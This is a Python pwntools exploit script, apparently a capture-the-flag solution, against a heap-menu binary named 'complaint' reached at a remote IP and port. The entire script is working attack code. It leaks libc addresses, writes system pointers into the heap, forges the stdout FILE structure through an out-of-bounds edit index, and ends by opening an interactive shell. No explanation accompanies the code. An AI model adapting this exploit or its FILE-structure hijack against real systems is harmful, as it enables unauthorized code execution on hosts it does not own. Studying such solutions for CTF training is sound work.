#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./complaint')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    offset = 0x3f0 - 88 - 0x10
else:
    p = remote('47.106.94.13', 50007)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    offset = 0x688
elf = ELF('./complaint', checksec=False)


def add(add_length, add_content):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('The complaint length you want:\n', str(add_length))
    p.sendafter('Input your complaint:', add_content)


def edit(edit_idx, edit_content):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('The complaint index you want to modify:\n', str(edit_idx))
    p.sendafter('Input your complaint:', edit_content)


def delete(delete_idx):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('The complaint index you want to delete:\n', str(delete_idx))


def show(show_idx):
    p.sendlineafter('Your choice: ', '4')
    p.sendlineafter('The complaint index you want to show:\n', str(show_idx))
    p.recvuntil('Your complaint: \n')


got_free = elf.got['free']
addr_magic = 0x6020a0
addr_ptr = 0x602140
add(0xff, '/bin/sh\x00')
show(0)
p.recv(8)
addr___malloc_hook = u64(p.recv(8)) - offset
success('addr___malloc_hook = ' + hex(addr___malloc_hook))
libcbase = addr___malloc_hook - libc.sym['__malloc_hook']
addr_system = libcbase + libc.sym['system']
addr__IO_2_1_stdin_ = libcbase + libc.sym['_IO_2_1_stdin_']
addr__IO_2_1_stdout_ = libcbase + libc.sym['_IO_2_1_stdout_']
addr_heap = u64(p.recv(8))

add(0x50, 'a' * 8)
pd = p64(0) * 2
pd += p64(addr_system) * 8
edit(1, pd)
# gdb.attach(p, "b *0x400AEC\nb *0x400d3b\nc")
pd = p64(0x68733bfbad8080) + p64(addr__IO_2_1_stdout_ + 131)
pd += p64(addr__IO_2_1_stdout_ + 131) + p64(addr__IO_2_1_stdout_ + 131)
pd += p64(addr__IO_2_1_stdout_ + 131) + p64(addr__IO_2_1_stdout_ + 131)
pd += p64(addr__IO_2_1_stdout_ + 131) + p64(addr__IO_2_1_stdout_ + 131)
pd += p64(addr__IO_2_1_stdout_ + 132) + p64(0)
pd += p64(0) + p64(0)
pd += p64(0) + p64(addr__IO_2_1_stdin_)
pd += p64(1) + p64(0xffffffffffffffff)
pd += p64(0) + p64(addr___malloc_hook - 0x1c70)
pd += p64(0xffffffffffffffff) + p64(0)
pd += p64(addr___malloc_hook - 0x370) + p64(0)
pd += p64(0) + p64(0)
pd += p64(0xffffffff) + p64(0)
pd += p64(0) + p64(addr_heap + 0x110)
pd += p64(addr_heap + 0x20)

edit((addr_magic - addr_ptr) / 8, pd)
success('addr___malloc_hook = ' + hex(addr___malloc_hook))
success('addr_system        = ' + hex(addr_system))
success('addr_heap          = ' + hex(addr_heap))
p.interactive()
